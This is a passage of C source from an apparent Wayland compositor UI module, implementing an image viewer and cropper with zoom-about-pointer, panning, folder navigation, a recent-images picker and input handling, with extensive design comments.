        if (strcmp(s->crop.nav[i], base) == 0) { s->crop.nav_at = i; break; }

    wlr_log(WLR_INFO, "synui: view: %d image(s) in %s, at %d",
            s->crop.nav_count, s->crop.nav_dir, s->crop.nav_at);
}

/* ── The viewer: geometry ────────────────────────────────────
 *
 * ONE mapping, as with the cropper: crop_fit() decides where a fitted picture
 * lands and this multiplies it by the zoom and offsets it by the pan. The
 * render and the pointer both ask crop_view_geom() and neither computes it,
 * which is what lets the wheel zoom about the pointer — that gesture is this
 * mapping run backwards and then forwards again.
 */

/* The largest zoom this image may take, as a multiple of its fitted scale.
 * Never below 1.0: an image already shown at more than VIEW_SCALE_MAX (a 32x32
 * icon on a 4K screen, if crop_fit ever scaled up) must still be allowed to
 * exist at its own fit, or the clamp would push the zoom below the only view
 * the viewer has. */
static double view_zoom_max(double fit)
{
    if (fit <= 0.0) return 1.0;
    double z = VIEW_SCALE_MAX / fit;
    return z < 1.0 ? 1.0 : z;
}

/* Clamp the centre point so the picture cannot be panned off the screen.
 *
 * Along an axis where the whole picture fits, the answer is its own middle:
 * that is what centres it, and it means the fitted case needs no special
 * handling anywhere else. Where it does not fit, the centre is held far enough
 * from each edge that the viewport stays inside the image — so panning stops at
 * the border rather than dragging the picture into empty space.
 */
static void view_center(syn_server_t *s, struct wlr_box *ob, double sc,
                        double *cx, double *cy)
{
    double c[2] = { s->crop.cx, s->crop.cy };
    double img[2] = { (double)s->crop.img_w, (double)s->crop.img_h };
    double view[2] = { ob->width / sc, ob->height / sc };   /* viewport, in image px */

    for (int i = 0; i < 2; i++) {
        if (view[i] >= img[i]) {
            c[i] = img[i] / 2.0;
        } else {
            double lo = view[i] / 2.0, hi = img[i] - view[i] / 2.0;
            if (c[i] < lo) c[i] = lo;
            if (c[i] > hi) c[i] = hi;
        }
    }

    *cx = c[0];
    *cy = c[1];
}

void crop_view_geom(syn_server_t *s, struct wlr_box *ob,
                    double *scale, double *ox, double *oy)
{
    double fit, fx, fy;
    crop_fit(s, ob, &fit, &fx, &fy);

    double zoom = s->crop.zoom;
    if (!(zoom >= 1.0)) zoom = 1.0;          /* also catches a NaN */
    double zmax = view_zoom_max(fit);
    if (zoom > zmax) zoom = zmax;

    double sc = fit * zoom;
    if (sc <= 0.0) sc = 1.0;                 /* a zero-sized output; draw something */

    double cx, cy;
    view_center(s, ob, sc, &cx, &cy);

    *scale = sc;
    /* Whole pixels, for the same reason crop_fit() rounds: a blit landing on a
     * fractional offset costs cairo a resample of the whole picture and softens
     * it, and the pointer mapping has to round identically or a click lands one
     * pixel from where it looks. */
    *ox = (double)(int)(ob->x + ob->width  / 2.0 - cx * sc + 0.5);
    *oy = (double)(int)(ob->y + ob->height / 2.0 - cy * sc + 0.5);
}

/* Write the clamped centre back. Called after anything moves or rescales the
 * view, so the STORED pan is always one the geometry would have produced —
 * otherwise a pan into the edge accumulates silently, and coming back takes as
 * many presses as went in. */
static void view_clamp(syn_server_t *s)
{
    struct wlr_box ob;
    server_output_box(s, &ob);

    double sc, ox, oy;
    crop_view_geom(s, &ob, &sc, &ox, &oy);
    view_center(s, &ob, sc, &s->crop.cx, &s->crop.cy);
}

/* Zoom by `factor`, holding the image point under (lx, ly) still.
 *
 * That is the whole difference between a zoom that feels like a magnifying
 * glass and one that feels like a slot machine: zooming about the centre of the
 * screen throws away the thing you were pointing at, and the deeper the zoom
 * the further it flies. For the keyboard the caller passes the centre of the
 * output, where the two behaviours are the same thing.
 */
static void view_zoom_about(syn_server_t *s, double factor, double lx, double ly)
{
    struct wlr_box ob;
    server_output_box(s, &ob);

    double sc, ox, oy;
    crop_view_geom(s, &ob, &sc, &ox, &oy);

    /* The image point under the pointer, before. */
    double ix = (lx - ox) / sc;
    double iy = (ly - oy) / sc;

    double fit, fx, fy;
    crop_fit(s, &ob, &fit, &fx, &fy);
    double zmax = view_zoom_max(fit);

    double z = s->crop.zoom * factor;
    if (z < 1.0)  z = 1.0;                   /* fitted is as far out as it goes */
    if (z > zmax) z = zmax;
    s->crop.zoom = z;

    double nsc = fit * z;
    if (nsc > 0.0) {
        /* Solve crop_view_geom() for the centre that puts (ix, iy) back under
         * (lx, ly) at the new scale. */
        s->crop.cx = ix + (ob.x + ob.width  / 2.0 - lx) / nsc;
        s->crop.cy = iy + (ob.y + ob.height / 2.0 - ly) / nsc;
    }

    view_clamp(s);
}

/* The keyboard's zoom: no pointer, so the point held still is the middle of the
 * screen — which is the middle of what you are looking at. */
static void view_zoom_step(syn_server_t *s, double factor)
{
    struct wlr_box ob;
    server_output_box(s, &ob);
    view_zoom_about(s, factor, ob.x + ob.width / 2.0, ob.y + ob.height / 2.0);
}

/* Zoom to an ABSOLUTE scale — what the 1 key (one image pixel per screen pixel)
 * asks for. Expressed as a factor so there is one zoom path and one clamp. */
static void view_zoom_to(syn_server_t *s, double want)
{
    struct wlr_box ob;
    server_output_box(s, &ob);

    double sc, ox, oy;
    crop_view_geom(s, &ob, &sc, &ox, &oy);
    if (sc > 0.0 && want > 0.0)
        view_zoom_about(s, want / sc, ob.x + ob.width / 2.0, ob.y + ob.height / 2.0);
}

/* Move the view by a distance in SCREEN pixels, converted here. Screen and not
 * image pixels so the picture moves the same distance under the hand whatever
 * it is being shown at — an image-pixel step is a crawl on a photograph and a
 * jump across an icon. */
static void view_pan(syn_server_t *s, double dx, double dy)
{
    struct wlr_box ob;
    server_output_box(s, &ob);

    double sc, ox, oy;
    crop_view_geom(s, &ob, &sc, &ox, &oy);
    if (sc <= 0.0) return;

    s->crop.cx += dx / sc;
    s->crop.cy += dy / sc;
    view_clamp(s);
}

/* Is there anywhere to pan? What decides whether the arrows walk the folder or
 * move the picture — see the note in view_key(). */
static bool view_can_pan(syn_server_t *s)
{
    struct wlr_box ob;
    server_output_box(s, &ob);

    double sc, ox, oy;
    crop_view_geom(s, &ob, &sc, &ox, &oy);

    return s->crop.img_w * sc > ob.width + 0.5 ||
           s->crop.img_h * sc > ob.height + 0.5;
}

/* ── Loading one image ───────────────────────────────────────
 *
 * The one place that replaces what is on screen, shared by the cropper, the
 * viewer and the folder walk.
 *
 * ⚠ Decodes BEFORE releasing what is up. The old shape released first, which is
 * cheaper by one image's worth of memory and wrong the moment there is
 * something to go back to: stepping the viewer onto a file that turns out not
 * to be a PNG would blank the panel and lose the picture that was fine. Fails
 * with nothing changed instead.
 */
static bool crop_load(syn_server_t *s, const char *path)
{
    cairo_surface_t *img = crop_decode(path);
    if (!img) {
        wlr_log(WLR_ERROR, "synui: crop: cannot decode '%s'", path);
        return false;
    }

    crop_release(s);

    s->crop.img   = img;
    s->crop.img_w = cairo_image_surface_get_width(img);
    s->crop.img_h = cairo_image_surface_get_height(img);
    syn_utf8_copy(s->crop.path, sizeof(s->crop.path), path);
    s->crop.status[0] = '\0';

    /* Open with the whole image selected. "Crop nothing" is never the intent,
     * and a full selection means Enter is a no-op copy rather than an error —
     * and it shows what the handles do before you have touched anything. It is
     * set here rather than in the cropper so that `c` in the viewer opens on a
     * whole selection too, with nothing to reset. */
    s->crop.ax = 0;
    s->crop.ay = 0;
    s->crop.bx = s->crop.img_w;
    s->crop.by = s->crop.img_h;
    s->crop.dragging = 0;
    /* Bottom-right, which the invariant already makes true here (b is the far
     * corner); called for the value rather than the effect, so the highlight is
     * on a real corner from the first frame. */
    crop_active_sync(s);

    /* The viewer opens on the whole picture too, and a step to the next one
     * does not inherit the last one's magnification: the zoom you chose was
     * about that photo, and carrying it over means every step lands somewhere
     * arbitrary in a picture you have not seen yet. */
    s->crop.zoom = 1.0;
    s->crop.cx   = s->crop.img_w / 2.0;
    s->crop.cy   = s->crop.img_h / 2.0;
    return true;
}

/* Say why, where it will be seen. From the list or the viewer this must NOT
 * close the panel — the answer to "that one is not really a PNG" is the panel
 * again with a line saying so, because one that vanishes and leaves a toast
 * behind makes you reopen it and re-find your place to try the next row. From a
 * file manager there is no panel to write on, so it is a toast or nothing. */
static void crop_cannot_open(syn_server_t *s, bool have_panel)
{
    if (have_panel) {
        snprintf(s->crop.status, sizeof(s->crop.status), "Cannot open that image");
        synui_render_crop(s);
        return;
    }
    char cmd[600];
    snprintf(cmd, sizeof(cmd),
             "notify-send -a synui 'Image' 'Cannot open that image'");
    synui_spawn(cmd);
}

/* ── Show / hide ─────────────────────────────────────────── */

/* Open on the recent-images list. This is what a bare `crop` or `view` bind
 * does, and what `synctl dispatch crop` with no argument now does — the panel
 * used to refuse both because it had no file, which made it the one thing here
 * that could not be put on a key.
 *
 * `for_crop` is carried rather than guessed: the same list serves two keys that
 * promise different things, and a row opened from the `view` bind that landed
 * in the cropper would be a key doing something its name did not say. */
static void crop_pick_open(syn_server_t *s, int for_crop)
{
    crop_release(s);
    view_nav_free(s);
    crop_recent_scan(s);

    s->crop.picking       = 1;
    s->crop.viewing       = 0;
    s->crop.pick_for_crop = for_crop;
    s->crop.from_pick     = 0;
    s->crop.from_view     = 0;
    s->crop.recent_sel    = 0;
    s->crop.recent_scroll = 0;
    s->crop.status[0]     = '\0';
    s->crop.visible       = 1;

    synui_render_crop(s);
}

void crop_open(syn_server_t *s, const char *path)
{
    if (!path || !*path) { crop_pick_open(s, 1); return; }

    bool from_list = s->crop.picking;
    bool from_view = s->crop.viewing && !s->crop.picking;

    /* Already decoded and on screen — this is `c` in the viewer. Re-reading the
     * file would be a second decode of the picture already being looked at, and
     * on a 24-megapixel photo that is a visible pause between pressing c and the
     * rectangle appearing. The selection is reset because crop_load() is what
     * normally does it and it is not running. */
    if (from_view && s->crop.img && strcmp(s->crop.path, path) == 0) {
        s->crop.ax = 0; s->crop.ay = 0;
        s->crop.bx = s->crop.img_w; s->crop.by = s->crop.img_h;
        s->crop.dragging = 0;
        crop_active_sync(s);
    } else if (!crop_load(s, path)) {
        crop_cannot_open(s, from_list || from_view);
        return;
    }

    s->crop.picking   = 0;
    s->crop.viewing   = 0;
    s->crop.from_pick = from_list;
    s->crop.from_view = from_view;
    s->crop.status[0] = '\0';

    s->crop.visible = 1;
    synui_render_crop(s);
}

/* The viewer. Same two shapes as crop_open() — a path opens the picture, no
 * path opens the list — and the list it opens is the same list, told to come
 * back here rather than to go on to the cropper. */
void crop_view_open(syn_server_t *s, const char *path)
{
    if (!path || !*path) { crop_pick_open(s, 0); return; }

    bool from_list = s->crop.picking;

    if (!crop_load(s, path)) {
        crop_cannot_open(s, from_list);
        return;
    }

    s->crop.picking   = 0;
    s->crop.viewing   = 1;
    s->crop.from_pick = from_list;
    s->crop.from_view = 0;

    /* The rest of the folder, so Left and Right have somewhere to go. Scanned
     * per open and not per step: the walk is the common case, and re-listing a
     * directory on every arrow press is the same event-loop mistake the
     * scaled-copy cache exists to undo. `r` rescans. */
    view_nav_scan(s);

    s->crop.visible = 1;
    synui_render_crop(s);
}

/* Back to the viewer from the cropper, WITHOUT re-reading the file: the image
 * is decoded and on screen already and only which face is drawing it changes.
 * Going through crop_view_open() would also mean handing it a pointer to the
 * panel's own path buffer, which it copies onto itself. */
static void crop_back_to_view(syn_server_t *s)
{
    s->crop.viewing   = 1;
    s->crop.from_view = 0;
    s->crop.dragging  = 0;
    s->crop.status[0] = '\0';
    /* The folder, if this image was never opened through the viewer — `c` after
     * a Dolphin ▸ Crop Image is the case: the cropper never lists one. */
    if (!s->crop.nav) view_nav_scan(s);
    synui_render_crop(s);
}

void crop_hide(syn_server_t *s)
{
    s->crop.visible = 0;
    s->crop.dragging = 0;
    s->crop.picking = 0;
    s->crop.viewing = 0;
    s->crop.from_pick = 0;
    s->crop.from_view = 0;
    hit_clear(&s->crop.hit);
    synui_render_crop(s);
    /* The surface can be large — a 6000x4000 photo is ~96 MB — and this panel
     * is opened once in a while rather than lived in. Nothing is cached. */
    crop_release(s);
    view_nav_free(s);
    ctlpanel_child_closed(s, "crop");
}

void crop_toggle(syn_server_t *s)
{
    /* It used to be that a bare toggle could only ever close, because opening
     * needed a path and a keybind has none to give. The recent-images list is
     * what it opens INTO now, which is what makes this bindable at all. */
    if (s->crop.visible) crop_hide(s);
    else crop_pick_open(s, 1);
}

void crop_view_toggle(syn_server_t *s)
{
    if (s->crop.visible) crop_hide(s);
    else crop_pick_open(s, 0);
}

/* ── The viewer: walking the folder ──────────────────────────
 *
 * Skips what it cannot decode rather than stopping on it. A folder with one
 * truncated download in it should not be a folder you cannot walk past, and
 * crop_load() leaves the current picture untouched when it fails — so the
 * failed step is invisible unless every remaining file fails, which is the one
 * case worth a line of status.
 */
static void view_step(syn_server_t *s, int delta)
{
    if (s->crop.nav_count < 1) return;

    int n = s->crop.nav_count;
    /* From "not in the list" (nav_at < 0), a step forward starts at the top of
     * the folder and a step back at the bottom. */
    int at = s->crop.nav_at;
    if (at < 0) at = delta > 0 ? -1 : 0;

    for (int tries = 0; tries < n; tries++) {
        at = (at + delta % n + n) % n;

        char path[sizeof(s->crop.path)];
        if (snprintf(path, sizeof(path), "%s/%s",
                     s->crop.nav_dir, s->crop.nav[at]) >= (int)sizeof(path))
            continue;

        /* The file already on screen, come all the way round: a folder with one
         * readable image in it. Nothing to do, and reloading it would be a
         * decode to arrive where we already are. */
        if (strcmp(path, s->crop.path) == 0) {
            s->crop.nav_at = at;
            return;
        }

        if (crop_load(s, path)) {
            s->crop.nav_at = at;
            synui_render_crop(s);
            return;
        }
    }

    snprintf(s->crop.status, sizeof(s->crop.status),
             "Nothing else here could be opened");
    synui_render_crop(s);
}

/* ── The viewer: keys ────────────────────────────────────────
 *
 * THE ARROWS DO TWO THINGS, and which one is not a mode — it is whether there
 * is anywhere to pan.
 *
 * Fitted, the whole picture is on screen and panning it is a no-op; the useful
 * meaning of Left and Right there is the folder, which is what every viewer
 * binds them to. Zoomed in, the picture is bigger than the screen and moving it
 * is the only thing the arrows could sensibly mean — stepping to the next photo
 * while looking at a detail of this one is never the intent.
 *
 * So: pan if there is anything to pan, walk otherwise. n and p walk regardless,
 * for the case where you are zoomed in and want the next one anyway.
 */
static int view_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
{
    bool shift = (mods & WLR_MODIFIER_SHIFT) != 0;
    double pan = VIEW_PAN_PX * (shift ? 4.0 : 1.0);
    bool panning = view_can_pan(s);

    switch (sym) {
    case XKB_KEY_Escape:
        /* Back to the list when that is where this came from, rather than out
         * to the desktop — the same rule the cropper follows, and for the same
         * reason: being dropped all the way out after opening the wrong file is
         * the one flow that would make the picker annoying to use. */
        if (s->crop.from_pick) { crop_pick_open(s, 0); return 1; }
        crop_hide(s);
        return 1;

    case XKB_KEY_BackSpace:
        if (s->crop.from_pick) { crop_pick_open(s, 0); return 1; }
        return 1;

    case XKB_KEY_q:
        crop_hide(s);
        return 1;

    /* Into the cropper, on the image already decoded and on screen. Enter as
     * well as c: from the recent-images list, Enter is what opened this, and
     * "the key that goes on" reads the same one step further in. */
    case XKB_KEY_c:
    case XKB_KEY_Return:
    case XKB_KEY_KP_Enter: {
        char path[sizeof(s->crop.path)];
        snprintf(path, sizeof(path), "%s", s->crop.path);
        crop_open(s, path);
        return 1;
    }

    /* Zoom. Both spellings of each: on most layouts the key is plain equal and
     * only becomes plus with Shift, and a viewer where zooming in needs a
     * modifier is a viewer that does not zoom in. */
    case XKB_KEY_plus:
    case XKB_KEY_equal:
    case XKB_KEY_KP_Add:
        view_zoom_step(s, VIEW_ZOOM_STEP);
        synui_render_crop(s);
        return 1;

    case XKB_KEY_minus:
    case XKB_KEY_KP_Subtract:
        view_zoom_step(s, 1.0 / VIEW_ZOOM_STEP);
        synui_render_crop(s);
        return 1;

    /* 0 fits, 1 is one image pixel per screen pixel — the two views worth
     * having a key each, and the numbers every other viewer uses for them. */
    case XKB_KEY_0:
    case XKB_KEY_KP_0:
        s->crop.zoom = 1.0;
        view_clamp(s);
        synui_render_crop(s);
        return 1;

    case XKB_KEY_1:
    case XKB_KEY_KP_1:
        view_zoom_to(s, 1.0);
        synui_render_crop(s);
        return 1;

    /* Rescan the folder. The walk is a snapshot taken when the picture opened,
     * and a screenshot arriving while you are looking at the last one is
     * exactly the case where that snapshot is one file out of date. */
    case XKB_KEY_r:
        view_nav_scan(s);
        s->crop.status[0] = '\0';
        synui_render_crop(s);
        return 1;

    case XKB_KEY_n:
    case XKB_KEY_space:
    case XKB_KEY_Page_Down:
        view_step(s, +1);
        return 1;

    case XKB_KEY_p:
    case XKB_KEY_Page_Up:
        view_step(s, -1);
        return 1;

    case XKB_KEY_Home:
        if (s->crop.nav_count > 0) { s->crop.nav_at = -1; view_step(s, +1); }
        return 1;

    case XKB_KEY_End:
        if (s->crop.nav_count > 0) { s->crop.nav_at = 0; view_step(s, -1); }
        return 1;

    case XKB_KEY_Left:
        if (panning) { view_pan(s, -pan, 0); synui_render_crop(s); }
        else         view_step(s, -1);
        return 1;

    case XKB_KEY_Right:
        if (panning) { view_pan(s, pan, 0); synui_render_crop(s); }
        else         view_step(s, +1);
        return 1;

    case XKB_KEY_Up:
        if (panning) { view_pan(s, 0, -pan); synui_render_crop(s); }
        return 1;

    case XKB_KEY_Down:
        if (panning) { view_pan(s, 0, pan); synui_render_crop(s); }
        return 1;

    default:
        return 1;   /* modal, as every other panel is */
    }
}

/* ── The recent-images list ──────────────────────────────────
 *
 * An ordinary rows-and-selection panel, unlike the cropper it opens into. Its
 * handlers are folded into crop_click/_key/_scroll rather than registered
 * separately because the two faces are one panel to SYN_PANEL_LIST — one
 * `visible`, one modal slot, one entry in the pointer and keyboard chains.
 */

static void crop_pick_scroll_to_sel(syn_server_t *s)
{
    if (s->crop.recent_sel < s->crop.recent_scroll)
        s->crop.recent_scroll = s->crop.recent_sel;
    else if (s->crop.recent_sel >= s->crop.recent_scroll + CROP_RECENT_ROWS)
        s->crop.recent_scroll = s->crop.recent_sel - CROP_RECENT_ROWS + 1;

    if (s->crop.recent_scroll < 0) s->crop.recent_scroll = 0;
}

static void crop_pick_move(syn_server_t *s, int delta)
{
    if (s->crop.recent_count < 1) return;

    s->crop.recent_sel += delta;
    if (s->crop.recent_sel < 0) s->crop.recent_sel = 0;
    if (s->crop.recent_sel >= s->crop.recent_count)
        s->crop.recent_sel = s->crop.recent_count - 1;

    s->crop.status[0] = '\0';
    crop_pick_scroll_to_sel(s);
    synui_render_crop(s);
}

/* Open the highlighted row — in the VIEWER or the CROPPER, whichever the list
 * was opened for. `for_crop` overrides it, which is the c and v keys below:
 * having picked a file, changing your mind about what to do with it should not
 * mean closing the list and pressing a different key to open it again.
 *
 * The path is copied out first: the open runs crop_release() and can rescan,
 * and handing it a pointer into the array it is about to rewrite is the kind of
 * thing that works until the day it does not. */
static void crop_pick_commit(syn_server_t *s, int for_crop)
{
    if (s->crop.recent_sel < 0 || s->crop.recent_sel >= s->crop.recent_count)
        return;

    char path[sizeof(s->crop.recent[0].path)];
    snprintf(path, sizeof(path), "%s", s->crop.recent[s->crop.recent_sel].path);

    if (for_crop) crop_open(s, path);
    else          crop_view_open(s, path);
}

static int crop_pick_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
{
    switch (sym) {
    case XKB_KEY_Escape:
    case XKB_KEY_q:
        crop_hide(s);
        return 1;

    case XKB_KEY_Return:
    case XKB_KEY_KP_Enter:
        crop_pick_commit(s, s->crop.pick_for_crop);
        return 1;

    /* Either face, from the same row. Both letters are free here — the list has
     * no text field — and they are the same letters the viewer uses. */
    case XKB_KEY_c:
        crop_pick_commit(s, 1);
        return 1;
    case XKB_KEY_v:
        crop_pick_commit(s, 0);
        return 1;

    case XKB_KEY_Up:
    case XKB_KEY_k:     crop_pick_move(s, -1); return 1;
    case XKB_KEY_Down:
    case XKB_KEY_j:     crop_pick_move(s,  1); return 1;
    case XKB_KEY_Page_Up:   crop_pick_move(s, -CROP_RECENT_ROWS); return 1;
    case XKB_KEY_Page_Down: crop_pick_move(s,  CROP_RECENT_ROWS); return 1;
    case XKB_KEY_Home:  crop_pick_move(s, -s->crop.recent_count); return 1;
    case XKB_KEY_End:   crop_pick_move(s,  s->crop.recent_count); return 1;

    /* Rescan. The list is a snapshot taken when the panel opened, and taking a
     * screenshot with it up is exactly the case where that snapshot is one
     * file out of date. */
    case XKB_KEY_r: {
        char keep[sizeof(s->crop.recent[0].path)] = "";
        if (s->crop.recent_sel < s->crop.recent_count)
            snprintf(keep, sizeof(keep), "%s",
                     s->crop.recent[s->crop.recent_sel].path);

        crop_recent_scan(s);

        /* Land on the same file if it survived, rather than on whatever row
         * number it used to be — the list is sorted by mtime and a rescan is
         * most often triggered BECAUSE something new arrived at the top. */
        s->crop.recent_sel = 0;
        for (int i = 0; i < s->crop.recent_count; i++)
            if (strcmp(s->crop.recent[i].path, keep) == 0) { s->crop.recent_sel = i; break; }

        s->crop.status[0] = '\0';
        crop_pick_scroll_to_sel(s);
        synui_render_crop(s);
        return 1;
    }

    default:
        (void)mods;
        return 1;   /* modal, as every other panel is */
    }
}

static int crop_pick_click(syn_server_t *s, double lx, double ly,
                           uint32_t button, uint32_t time_msec)
{
    (void)time_msec;

    /* Outside the panel closes it, the same as every other picker here. */
    if (!hit_in_panel(&s->crop.hit, lx, ly)) { crop_hide(s); return 1; }
    if (button != BTN_LEFT) return 1;

    int i = hit_index_at(&s->crop.hit, lx, ly);
    if (i < 0 || i >= s->crop.recent_count) return 1;   /* chrome */

    /* Single click opens, unlike curpick's double. There is no live preview to
     * step through here — selecting a row does nothing on its own — so making
     * you click twice would be ceremony. Escape from the cropper comes back. */
    s->crop.recent_sel = i;
    crop_pick_commit(s, s->crop.pick_for_crop);
    return 1;
}

/* ── Pointer ─────────────────────────────────────────────────
 *
 * A press-drag-release, unlike every other panel here, because a rectangle is
 * what is being described. The press starts it, pointer_motion in input.c feeds
 * it while s->crop.dragging is set, and the release ends it — the same three
 * hooks the desktop-icon drag uses.
 */

int crop_click(syn_server_t *s, double lx, double ly, uint32_t button,
               uint32_t time_msec)
{
    if (!s->crop.visible) return 0;
    if (s->crop.picking) return crop_pick_click(s, lx, ly, button, time_msec);
    if (button != BTN_LEFT) return 1;

    /* In the viewer a press drags the PICTURE — the one gesture a mouse has
     * over an image that is bigger than the screen. It uses the same `dragging`
     * flag the selection does, so input.c's motion routing is unchanged and
     * there is one thing to clear on release; crop_drag_motion() below asks
     * which face is up. */
    if (s->crop.viewing) {
        s->crop.dragging = 1;
        s->crop.pan_lx = lx;
        s->crop.pan_ly = ly;
        return 1;
    }

    /* A press ON A HANDLE adjusts the selection; anywhere else starts a new
     * one. Without this every press could only ever begin a fresh rectangle, so
     * "bring the right edge in a bit" meant redrawing the whole thing from the
     * opposite corner and hoping you landed back on the same three edges.
     *
     * Making the grabbed corner ACTIVE is the whole implementation: the
     * invariant is that b is the active corner, so crop_drag_motion() below
     * moves exactly the corner under the pointer without knowing that is what
     * it is doing. It also leaves the keyboard on that corner afterwards, so
     * grabbing the top-left and then pressing Left continues the same
     * adjustment instead of jumping to some other corner. */
    int corner = crop_corner_at(s, lx, ly);
    if (corner >= 0) {
        crop_set_active(s, corner);
    } else {
        int ix, iy;
        crop_to_image(s, lx, ly, &ix, &iy);
        s->crop.ax = s->crop.bx = ix;
        s->crop.ay = s->crop.by = iy;
        crop_active_sync(s);
    }

    s->crop.dragging = 1;
    s->crop.status[0] = '\0';

    synui_render_crop(s);
    return 1;
}

void crop_drag_motion(syn_server_t *s, double lx, double ly)
{
    if (!s->crop.visible || !s->crop.dragging) return;

    /* The picture follows the pointer, so the delta is applied to the view the
     * other way round: dragging right brings what is on the LEFT into view. */
    if (s->crop.viewing) {
        view_pan(s, s->crop.pan_lx - lx, s->crop.pan_ly - ly);
        s->crop.pan_lx = lx;
        s->crop.pan_ly = ly;
        synui_render_crop(s);
        return;
    }

    crop_to_image(s, lx, ly, &s->crop.bx, &s->crop.by);
    /* Drag a corner past its opposite and it becomes a different corner. */
    crop_active_sync(s);
    synui_render_crop(s);
}

void crop_drag_end(syn_server_t *s, double lx, double ly)
{
    if (!s->crop.visible || !s->crop.dragging) return;

    if (s->crop.viewing) {
        crop_drag_motion(s, lx, ly);   /* the last few pixels of the drag */
        s->crop.dragging = 0;
        return;
    }

    crop_to_image(s, lx, ly, &s->crop.bx, &s->crop.by);
    s->crop.dragging = 0;

    /* A click with no travel is not a selection. Put the whole image back
     * rather than leaving a zero-size rect that Enter would refuse to write —
     * a panel that silently stops responding to Enter is worse than one that
     * visibly resets.
     *
     * Tapping a HANDLE without moving it does not trip this, and needs no
     * special case to avoid it: grabbing a corner leaves the rectangle exactly
     * as it was, so the selection is still whatever it already was and still
     * passes. Only a genuine stray click on the picture — which collapses a/b
     * onto one point — reaches the reset. */
    if (!crop_has_selection(s)) {
        s->crop.ax = 0; s->crop.ay = 0;
        s->crop.bx = s->crop.img_w; s->crop.by = s->crop.img_h;
    }
    crop_active_sync(s);
    synui_render_crop(s);
}

int crop_motion(syn_server_t *s, double lx, double ly)
{
    (void)lx; (void)ly;
    /* The drag itself is fed by input.c's pointer_motion through
     * crop_drag_motion(); this only claims the pointer so it never reaches the
     * window underneath the full-screen panel. */
    return s->crop.visible ? 1 : 0;
}

int crop_scroll(syn_server_t *s, double lx, double ly, double delta)
{
    if (!s->crop.visible) return 0;

    /* The viewer zooms about the pointer, which is what a wheel over a picture
     * means everywhere else. Not the folder: a wheel that walked to the next
     * photograph would make zooming impossible on the one input device that has
     * an obvious way to ask for it. */
    if (s->crop.viewing && delta != 0) {
        view_zoom_about(s, delta < 0 ? VIEW_ZOOM_STEP : 1.0 / VIEW_ZOOM_STEP,
                        lx, ly);
        synui_render_crop(s);
        return 1;
    }

    /* The list scrolls; the cropper has nothing to scroll and swallows it,
     * because a wheel event reaching the window under a modal full-screen panel
     * is the bug the panel pointer contract exists to prevent. */
    if (s->crop.picking && delta != 0 && hit_in_panel(&s->crop.hit, lx, ly) &&
        s->crop.recent_count > CROP_RECENT_ROWS) {
        /* Scrolls the WINDOW, not the selection — the same call curpick and
         * wppick make, and here a click opens a row outright, so a wheel that
         * dragged the selection along under the pointer would put a different
         * file under the next click than the one you were aiming at. */
        s->crop.recent_scroll += delta > 0 ? 3 : -3;
        if (s->crop.recent_scroll > s->crop.recent_count - CROP_RECENT_ROWS)
            s->crop.recent_scroll = s->crop.recent_count - CROP_RECENT_ROWS;
        if (s->crop.recent_scroll < 0) s->crop.recent_scroll = 0;
        synui_render_crop(s);
    }

    return 1;
}

/* ── Keys ────────────────────────────────────────────────── */

/* Nudge the ACTIVE corner. That is `b` by the invariant, which is the corner a
 * drag was still holding — so keyboard adjustment continues the gesture rather
 * than starting a different one.
 *
 * WHY THE ACTIVE CORNER IS SELECTABLE AT ALL
 *
 * This used to move `b` and nothing else, with no way to change which corner
 * that was, and the panel opens with the whole image selected — a at the
 * top-left, b at the bottom-right. So b was pinned against the clamps below on
 * both axes from the first frame: Right and Down were silent no-ops and only
 * Left and Up did anything. The keyboard could shrink the selection from the
 * right and the bottom and could not reach the other two edges at all, which
 * reads as "the arrows only go up and left". Tab moves the active corner, so
 * every edge has a key that moves it. */
static void crop_nudge(syn_server_t *s, int dx, int dy, int step)
{
    s->crop.bx += dx * step;
    s->crop.by += dy * step;

    if (s->crop.bx < 0) s->crop.bx = 0;
    if (s->crop.by < 0) s->crop.by = 0;
    if (s->crop.bx > s->crop.img_w) s->crop.bx = s->crop.img_w;
    if (s->crop.by > s->crop.img_h) s->crop.by = s->crop.img_h;

    crop_active_sync(s);
}

/* Slide the whole selection, size unchanged.
 *
 * Clamped as a RECTANGLE. Clamping the two corners independently — which is
 * what reusing crop_nudge() twice would do — lets the leading edge stop at the
 * border while the trailing one keeps coming, so a move into the edge silently
 * becomes a resize and the selection you carefully sized is a different size
 * when it arrives. */
static void crop_pan(syn_server_t *s, int dx, int dy, int step)
{
    int x, y, w, h;
    crop_selection(s, &x, &y, &w, &h);

    int nx = x + dx * step, ny = y + dy * step;

    if (nx + w > s->crop.img_w) nx = s->crop.img_w - w;
    if (ny + h > s->crop.img_h) ny = s->crop.img_h - h;
    if (nx < 0) nx = 0;
    if (ny < 0) ny = 0;

    /* Applied as a delta to both corners so their ROLES survive: a and b stay
     * the same two corners of the picture they were, and the active corner does
     * not change under a key that was only supposed to move things. */
    int mx = nx - x, my = ny - y;
    s->crop.ax += mx; s->crop.bx += mx;
    s->crop.ay += my; s->crop.by += my;
}

int crop_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
{
    if (!s->crop.visible) return 0;

    /* SUPER combos still reach the global bind table, the same contract curpick
     * keeps. Without this the panel's own key — super+shift+x — would be
     * swallowed by the panel it opened, so the one thing a toggle has to do
     * (press it again to put it away) would be the one thing it could not.
     *
     * Only Super. Shift and Ctrl are load-bearing here: Shift is the coarse
     * step and Ctrl moves instead of resizing, and passing either through would
     * take those out to fix a key nothing binds. */
    if (mods & WLR_MODIFIER_LOGO) return 0;

    if (s->crop.picking) return crop_pick_key(s, sym, mods);
    if (s->crop.viewing) return view_key(s, sym, mods);

    /* Shift makes the arrows coarse. A 6000px photo needs more than 1px per
     * keypress to be adjustable by keyboard at all. */
    int step = (mods & WLR_MODIFIER_SHIFT) ? 25 : 1;
    /* Ctrl moves the selection instead of resizing it. Same keys, because
     * "which corner" and "the whole box" are the same gesture at different
     * grain, and a cropper with no way to slide a sized rectangle across a
     * photo makes you rebuild it every time you want it an inch to the left. */
    bool pan = (mods & WLR_MODIFIER_CTRL) != 0;

    switch (sym) {
    case XKB_KEY_Escape:
        /* Back to wherever this came FROM, rather than out to the desktop:
         * the viewer if c opened the cropper, the list if a row did. Opening
         * something, deciding against it and being dropped all the way out is
         * the one flow that would make either of them annoying to use. `q`
         * still leaves outright.
         *
         * The viewer first: a file opened from the list and then viewed has
         * both flags set, and the way back is one step, not two. */
        if (s->crop.from_view) { crop_back_to_view(s); return 1; }
